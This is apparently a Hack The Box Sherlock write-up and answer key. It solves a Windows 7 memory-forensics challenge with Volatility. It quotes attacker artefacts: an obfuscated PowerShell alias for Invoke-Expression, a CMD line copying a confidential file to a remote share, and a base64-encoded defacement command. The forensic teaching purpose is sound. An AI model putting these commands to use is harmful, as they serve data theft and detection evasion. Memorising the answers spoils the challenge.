---
title: Recollection Sherlock
date: 2024-02-11 12:00:00
categories: [HTB, Sherlock]
tags: [htb]
pin: true
math: true
mermaid: true
image:
  path: /assets/img/recollection.png
  lqip:
  alt: Recollection sherlock

---

## Sherlock Scenario

A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.

## Usefull tools:

- [Volatility 2](https://www.osforensics.com/downloads/VolatilityWorkbench-v2.1.zip) 
- [Volatility 3](https://www.osforensics.com/downloads/VolatilityWorkbench.zip)
- [MemProcFS](https://github.com/ufrisk/MemProcFS/releases/download/v5.8/MemProcFS_files_and_binaries_v5.8.25-win_x64-20240207.zip)
- [Bulk extractor](https://digitalcorpora.s3.amazonaws.com/downloads/bulk_extractor/bulk_extractor-1.6.0-dev-windowsinstaller.exe)
- [EZ Tools](https://f001.backblazeb2.com/file/EricZimmermanTools/Get-ZimmermanTools.zip)

## Task 01

What is the Operating System of the machine?

**Volatility3** helped me more than **Volatility2** to get the Windows version. Mentioned below is the command used to get the windows version by **Volatility3**.

```bash
>> vol.exe -f C:\Users\Administrator\Desktop\recollection\recollection.bin windows.info.Info

Volatility 3 Framework 2.5.0
Progress:  100.00               PDB scanning finished
Variable        Value
Kernel Base     0xf8000285c000
DTB     0x187000
Symbols file:///C:/Users/Administrator/Desktop/VolatilityWorkbench/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdDebuggerDataBlock     0xf80002a3f120
NTBuildLab      7601.24214.amd64fre.win7sp1_ldr_
CSDVersion      1
KdVersionBlock  0xf80002a3f0e8
Major/Minor     15.7601
MachineType     34404
KeNumberProcessors      1
SystemTime      2022-12-19 16:07:30
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  1
PE Machine      34404
PE TimeDateStamp        Thu Aug  2 02:18:10 2018
```

Answer is: `Windows 7`

## Task 02

Here we take the last time of the system as the time when the memory dump was created. It can be obtained using the `windows.info.Info` option previously used in volatility3.

```bash
SystemTime      2022-12-19 16:07:30
```

Answer is: `2022-12-19 16:07:30`

## Task 03

After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

This can be achieved using volatility2. Since volatility 2 has a larger number of plugins than volatility3, you can easily use the **clipboard** plugin in volatility2 to get the answer to this question.

```bash
>> volatility.exe clipboard -f C:\Users\Administrator\Desktop\recollection\recollection.bin --profile=Win7SP0x64
```

![](https://telegra.ph/file/91611ea1beef2ff753206.png)

Answer is: `(gv '*MDR*').naMe[3,11,2]-joIN''`

## Task 04

The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

We can use powershell to deobfuscate the obfuscated command used by the attacker. When you type and execute that command on powershell, you can see its real command as an output.

This article will help you to know more about this obfuscate method : https://www.securonix.com/blog/hiding-the-powershell-execution-flow/

```bash
PS C:\Users\ghost>> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
```

`Invoke expressions (IEX)` in PowerShell are a common method of executing code. They allow for the evaluation of expressions and the execution of code that is stored in a variable. Threat actors often use them for their ability to launch both local and remote payloads. The author of a malware usually wants their code to execute without detection and obfuscation is a useful tool to help them achieve this. It is an effective way to bypass signature detection as it randomizes malicious strings.

Answer is: `Invoke-Expression`

## Task 05

A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

This can be obtained by cmdscan, a command line history plugin in vol2.

```bash
>> volatility.exe cmdscan -f C:\Users\Administrator\Desktop\recollection\recollection.bin --profile=Win7SP0x64
```
![](https://telegra.ph/file/59657e72985c4ba3acdc4.png)

Attacker attempts to copy this command from a file located at `C:\Users\Public\Secret\Confidential.txt` to a file named `pass.txt` located at network location `\\192.168.0.171\pulice\`.

### Breaking it down:

- `type`: This command is typically used in Windows to display the contents of a text file. However, when combined with the redirection operator (>), it's used to output the contents of a file.

- `C:\Users\Public\Secret\Confidential.txt`: This is the path to the source file whose contents are to be copied.

- `>`: This is the redirection operator, used to redirect the output of a command. In this context, it's used to redirect the contents of the file to another location instead of displaying them in the console.

- `\\192.168.0.171\pulice\pass.txt`: This is the destination where the contents of the file will be copied. \\192.168.0.171\pulice\ is a network path, and pass.txt is the name of the file where the contents will be written.

Answer is: `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`

## Task 06

Following the above command, now tell us if the file was exfiltrated successfully?

No, However there are some potential issues in the command:

- There seems to be a typo in the destination path. "pulice" might be intended to be "public".
- The destination path should be accessible and the user running the command should have appropriate permissions to write to the destination file.
- The source file (Confidential.txt) should exist at the specified location

![](https://telegra.ph/file/423ecfaede10a89ec9dd9.png)

Answer is: `No`

## Task 07

The attacker tried to create a readme file. What was the full path of the file?

You can get the answer to this question from the output from the cmdscan plugin we used earlier. You can't see it clearly because it is encoded in attacker base64.

![](https://telegra.ph/file/25591fd104a235d67102c.png)

You can use the following powershell command to decrypt it.

```powershell
$encodedString = "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedString))
Write-Output $decodedString
```

![](https://telegra.ph/file/75a9ddf890b3724fc9589.png)

Answer is: `C:\Users\Public\Office\readme.txt`

## Task 08

What was the Host Name of the machine?

We can get this from windows registry. Typically, volatility2 uses the hivelist plugin to view windows registry hives.

```bash
>> volatility.exe hivelist -f C:\Users\Administrator\Desktop\recollection\recollection.bin --profile=Win7SP0x64
```
![](https://telegra.ph/file/124d8b51fec94773dbb0c.png)

Generally, the computer name of windows is saved in the `SYSTEM` hive.

A **SYSTEM hive** typically refers to a key component of the Windows Registry, a hierarchical database used by the Windows operating system to store configuration settings and options. The `SYSTEM` hive specifically contains information about the hardware configuration of the computer, as well as settings related to device drivers and system services.

In a Windows environment, the computer name is typically stored in the Windows Registry. Specifically, it's stored under the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName` key.

Within this key, you'll find two values:

- `ComputerName`: This holds the actual computer name.
- `ComputerNameExtension`: This value is used for domains, appending a suffix to the computer name when it's joined to a domain.

Now, let's dump the registry key where the hostname will be revealed:

```bash
>> volatility.exe -f C:\Users\Administrator\Desktop\recollection\recollection.bin --profile=Win7SP0x64 printkey -o 0xfffff8a000024010 -K "ControlSet001\Control\ComputerName\ComputerName"
```

![](https://telegra.ph/file/322a636a9f59525c17bd0.png)

Answer is: `USER-PC`

## Task 09

How many user accounts were in the machine?

You can get the user list using the `hashdump` plugin in vol2.

```bash
>> volatility.exe -f C:\Users\Administrator\Desktop\recollection\recollection.bin --profile=Win7SP0x64 hashdump
```
![](https://telegra.ph/file/4a823b3cf8941c92feb4e.png)

Answer is: `3`

## Task 10

In the **\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge** folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

This can be achieved using the filescan plugin in vol2. Here, the output from vol2 is saved to a file called file.txt. Because it is easy to investigate later.

```bash
>> volatility.exe -f C:\Users\Administrator\Desktop\recollection\recollection.bin --profile=Win7SP0x64 filescan --output-file=file.txt
```
![](https://telegra.ph/file/7c63e9cd4b75742a79868.png)

Answer is: `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

## Task 11

A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?

Usually here, I first used the `malfind` plugin in vol2 and checked for malicious activity. There I could see several processes of powershell.exe suspiciously.

![](https://telegra.ph/file/3a24386bd58737051ac6f.png)

Then the `pstree` plugin was used to check the process id. There I could see cmd.exe as the parent process of that powershell process.

![](https://telegra.ph/file/621d50d08be513e9f7308.png)

Later, it was possible to conclude that the attacker had carried out a malicious activity using cmd. The `cmdscan` plugin was then used again to check the command line history.

![](https://telegra.ph/file/342f50c78f310bf26a12b.png)

It appears that a file named `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe` is being executed. Because the hash appears in the name of this executable, it is classified as Malicious in Virustotal.

![](https://telegra.ph/file/dc05d65e8047002da1927.png)

Answer is: `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`

## Task 12

Following the previous question, what is the Imphash of the malicous file you found above?

Imphash, short for "import hash," is a concept and technique used in the field of malware analysis and binary similarity detection. It involves creating a hash value based on the imported function calls within a binary executable file.

When a Windows executable loads, it imports functions from various dynamic link libraries (DLLs) that it uses during runtime. Imphash generates a hash value based on the names of these imported functions and the DLLs from which they are imported. This hash value is then used to uniquely identify a specific set of imported functions and their corresponding DLLs.

We can get the imphash of this malicious exe from Virustotal itself.

![](https://telegra.ph/file/b7afe3d3c12c0faa6b28f.png)

Answe is: `d3b592cd9481e4f053b5362e22d61595`

## Task 13

Following the previous question, tell us the date in UTC format when the malicious file was created?

We can get the creation date of the malicious file from the file history of Virustotal.

![](https://telegra.ph/file/c7fe348690cec3ceeb77a.png)

Answer is: `2022-06-22 11:49:04`

## Task 14

What was the local IP address of the machine?

To obtain network information, we had to use vol3. Because the plugin used to display the network connection in vol2 does not support it. Windows.netscan.The NetScan plugin was used to view network information in vol3.

![](https://telegra.ph/file/9ade4c586658e5f15d37c.png)

Answer is: `192.168.0.104`

## Task 15

There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?

This was seen when we were looking for the malicious file hash in Task 11. Because it was clearly visible in the process list as cmd.exe.

Answe is: `cmd.exe`

### Step 01

![](https://telegra.ph/file/fb479885b2c0af3ddc014.png)

### Step 02

You can get the email address after some time after uploading the image file.

![](https://telegra.ph/file/62f8d3d5a92f431c24f7f.png)


Asnwer is: `mafia_code1337@gmail.com`

For Task 17 and Task 18 here, you can use volatiliy to dump the $MFT file and get those two answers.

